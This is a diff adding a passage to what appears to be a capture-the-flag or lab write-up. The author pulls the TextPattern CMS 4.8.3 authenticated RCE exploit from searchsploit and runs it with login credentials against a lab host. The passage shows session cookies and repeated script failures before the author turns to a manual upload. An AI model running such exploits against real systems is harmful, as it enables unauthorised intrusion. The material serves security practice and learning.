@@ -945,3 +945,89 @@ requests.exceptions.MissingSchema: Invalid URL '192.168.189.219/textpattern/text
 
 ```
 
+Attempted to use a different exploit found using searchsploit
+
+```
+┌──(kali㉿kali)-[~/Downloads]
+└─$ searchsploit -m php/webapps/48943.py
+  Exploit: TextPattern CMS 4.8.3 - Remote Code Execution (Authenticated)
+      URL: https://www.exploit-db.com/exploits/48943
+     Path: /usr/share/exploitdb/exploits/php/webapps/48943.py
+    Codes: N/A
+ Verified: True
+File Type: Python script, Unicode text, UTF-8 text executable
+Copied to: /home/kali/Downloads/48943.py
+
+
+                                                                                                                              
+┌──(kali㉿kali)-[~/Downloads]
+└─$ nano 48943.py 
+                                                                                                                              
+┌──(kali㉿kali)-[~/Downloads]
+└─$ python 48943.py                                        
+
+Software: TextPattern <= 4.8.3
+CVE: CVE-2020-XXXXX - Authenticated RCE via Unrestricted File Upload
+Author: Michele '0blio_' Cisternino
+
+[*] USAGE: python3 exploit.py http://target.com username password
+[*] EXAMPLE: python3 exploit.py http://localhost admin admin
+
+                                                                                                                              
+┌──(kali㉿kali)-[~/Downloads]
+└─$ python 48943.py http://192.168.189.219 mayer lionheart
+
+Software: TextPattern <= 4.8.3
+CVE: CVE-2020-XXXXX - Authenticated RCE via Unrestricted File Upload
+Author: Michele '0blio_' Cisternino
+
+[*] Authenticating to the target as 'mayer'
+Traceback (most recent call last):
+  File "/home/kali/Downloads/48943.py", line 83, in <module>
+    log.success ("Logged in as '{}' (Cookie: txp_login={}; txp_login_public={})".format(username, s.cookies['txp_login'], s.cookies['txp_login_public']))
+                                                                                                  ~~~~~~~~~^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/cookies.py", line 334, in __getitem__
+    return self._find_no_duplicates(name)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/requests/cookies.py", line 413, in _find_no_duplicates
+    raise KeyError(f"name={name!r}, domain={domain!r}, path={path!r}")
+KeyError: "name='txp_login', domain=None, path=None"
+                                                                                                                              
+┌──(kali㉿kali)-[~/Downloads]
+└─$ python 48943.py http://192.168.189.219/textpattern/ mayer lionheart
+
+Software: TextPattern <= 4.8.3
+CVE: CVE-2020-XXXXX - Authenticated RCE via Unrestricted File Upload
+Author: Michele '0blio_' Cisternino
+
+[*] Authenticating to the target as 'mayer'
+[✓] Logged in as 'mayer' (Cookie: txp_login=mayer%2C334094ff71a044371a19f859c5e89db8; txp_login_public=9698a681acmayer)
+[*] Grabbing _txp_token (required to proceed with exploitation)..
+Traceback (most recent call last):
+  File "/home/kali/Downloads/48943.py", line 89, in <module>
+    scriptJS = soup.find_all("script")[2].string.replace("var textpattern = ", "")[:-2]
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AttributeError: 'NoneType' object has no attribute 'replace'
+                                                                                                                              
+┌──(kali㉿kali)-[~/Downloads]
+└─$ python 48943.py http://192.168.189.219/textpattern/ mayer lionheart
+
+Software: TextPattern <= 4.8.3
+CVE: CVE-2020-XXXXX - Authenticated RCE via Unrestricted File Upload
+Author: Michele '0blio_' Cisternino
+
+[*] Authenticating to the target as 'mayer'
+[✓] Logged in as 'mayer' (Cookie: txp_login=mayer%2Cfd74f9015c61c2b3d9e8c0b9114b1980; txp_login_public=b555a23cbcmayer)
+[*] Grabbing _txp_token (required to proceed with exploitation)..
+Traceback (most recent call last):
+  File "/home/kali/Downloads/48943.py", line 89, in <module>
+    scriptJS = soup.find_all("script")[2].string.replace("vartextpattern = ", "")[:-2]
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AttributeError: 'NoneType' object has no attribute 'replace'
+
+```
+
+After deciding that it is too much of a hassle to fix those broken scripts, I've went ahead and attempted to upload the file manually from the CMS page directly 
+
+![](attachments/Pasted%20image%2020250214215833.png)
+
